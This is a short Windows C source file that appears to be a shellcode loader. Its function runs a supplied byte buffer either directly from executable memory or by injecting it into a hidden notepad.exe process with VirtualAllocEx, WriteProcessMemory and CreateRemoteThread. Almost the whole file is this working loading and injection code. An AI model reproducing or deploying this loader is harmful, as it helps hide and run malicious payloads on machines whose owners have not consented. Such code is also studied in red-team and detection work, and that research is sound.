#include <stdio.h>
#include <Windows.h>
#include <tchar.h>

#include "loader.h"
#include "config.h"


#ifdef NORMAL

void sc(unsigned char *c, int c_len) {
    void *exec = NULL;


    printf("[+] Alloc Code Memory\n");
	exec = VirtualAlloc(0, c_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);


    memcpy(exec, c, c_len);
	printf("[+] Call Code\n");
	((void(*)())exec)();
	printf("[+] Done.\n");
}

#elif defined(INJECT)
void sc(unsigned char *c, int c_len) {
	PROCESS_INFORMATION stProcessInfo = {0};
	STARTUPINFO stStartUpInfo = {0};
	stStartUpInfo.cb = sizeof(stStartUpInfo);

	stStartUpInfo.dwFlags |= STARTF_USESHOWWINDOW;
	stStartUpInfo.wShowWindow = SW_HIDE;
	if (!CreateProcess(NULL,_T("notepad.exe"),NULL,NULL, 0, 0, NULL, NULL, &stStartUpInfo, &stProcessInfo)) {
		printf("[-] Create Process Failed");
		return;
	}
	HANDLE hProc= OpenProcess(0x1F0FFF, 0, stProcessInfo.dwProcessId);
	if (hProc == 0) {
		printf("[-] OpenProcess Failed");
		return;
	}
	LPVOID rMem = (PTSTR)VirtualAllocEx(hProc, NULL, c_len, MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	if (rMem == NULL) {
        CloseHandle(hProc);
  		printf("[-] Create Memory Failed");
		return;
 	}
	if (!WriteProcessMemory(hProc, rMem, c, c_len, NULL)) {
		CloseHandle(hProc);
  		printf("[-] Write Memory Failed");
		return;
	}

	if (CreateRemoteThread(hProc, NULL, 0,(LPTHREAD_START_ROUTINE) rMem,NULL,0, NULL) == NULL) {
  		printf("[-] Call Code Failed");
	}
	CloseHandle(hProc);
}
#else
void sc(unsigned char *c, int c_len) {
	printf("[-] Hello World!\n");
}
#endif 